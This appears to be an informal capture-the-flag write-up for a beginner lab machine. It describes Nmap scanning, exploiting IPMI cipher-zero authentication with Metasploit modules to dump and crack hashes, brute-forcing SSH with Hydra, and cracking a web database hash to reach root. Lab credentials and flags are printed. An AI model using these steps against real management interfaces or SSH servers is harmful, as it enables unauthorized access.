
breif `###### An easy little machine for beginners.` 


- objective 
	- exploit and get the flag

# enum 

target = 192.168.0.100 

```sql 
# Nmap 
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 08:00:27:62:32:24 (Oracle VirtualBox virtual NIC)

22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e7cef2f65da7475a162f900707334ea9 (ECDSA)
|_  256 09dbb7e8eed452b849c3cc29a56e0735 (ED25519)
MAC Address: 08:00:27:62:32:24 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- only port 22 tcp 
- calm lets try brute forcing 
-  nothing 
- lets enumerate again this time udp 
```sql 
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e7cef2f65da7475a162f900707334ea9 (ECDSA)
|_  256 09dbb7e8eed452b849c3cc29a56e0735 (ED25519)
623/udp open  asf-rmcp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port623-UDP:V=7.93%I=7%D=7/30%Time=66A8745F%P=x86_64-pc-linux-gnu%r(ipm
SF:i-rmcp,1E,"\x06\0\xff\x07\0\0\0\0\0\0\0\0\0\x10\x81\x1cc\x20\x008\0\x01
SF:\x97\x04\x03\0\0\0\0\t");

```

# exploitation 

okay port 623 asf-rmpc what is that? 
for remote management of systems yeah on port udp lets try to get creds and login into this thing 
- hacktricks 
- use auxilary/scanner/ipmi/ipmi_version 
- `IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0`
- we used this auxiliary/scanner/ipmi/ipmi_cipher_zero goo and it says vulnerable yes 
- lets dump hashes
- boom 
`[+] 192.168.0.118:623 - IPMI - Hash found: admin:447f777f020100004d615d91440c57637bb7f22ea938e9826199c0fad9cbb3170065db0e273ce2aaa123456789abcdefa123456789abcdef140561646d696e:d7c8594cbba9b726e2d52f49b12c10262bc0e96d[+] 192.168.0.118:623 - IPMI - Hash for user 'admin' matches password 'cukorborso'`

login it with ipmitools  and list users and then dump the hashes 
output them as john 
use awk to cut out the unwanted strings and load them in to hydra start ssh bruteforce 
got the username and password for ssh 
`[22][ssh] host: 192.168.0.118   login: onida   password: jiggaman`
`onida`  pass = `jiggaman`

got the user.txt `f75390001fa2fe806b4e3f1e5dadeb2b`

lets go for root

# Priveleage 

linpeas nothing 
checl /var/www/html found sqlite3 databese cat it out 
hash = `atom:$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm` which is `madison`  when crack 
now we got root 
root.txt = `d3a4fd660f1af5a7e3c2f17314f4a962`

